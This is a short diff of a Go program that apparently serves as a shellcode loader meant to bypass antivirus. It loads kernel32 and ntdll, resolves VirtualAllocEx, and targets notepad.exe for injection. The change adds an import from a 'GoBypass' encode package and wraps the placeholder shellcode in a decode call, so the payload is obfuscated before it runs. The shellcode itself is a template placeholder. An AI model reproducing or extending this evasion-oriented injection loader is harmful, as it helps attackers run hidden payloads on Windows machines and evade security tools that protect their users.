@@ -4,6 +4,7 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
+	"github.com/EmYiQing/GoBypass/encode"
 	"golang.org/x/sys/windows"
 	"syscall"
 	"unsafe"
@@ -142,7 +143,7 @@ type ImageOptionalHeader32 struct {
 
 func main() {
 	program := "C:\\Windows\\System32\\notepad.exe"
-	shellcode, _ := hex.DecodeString("__SHELLCODE__")
+	shellcode, _ := hex.DecodeString(encode.Decode("__SHELLCODE__"))
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
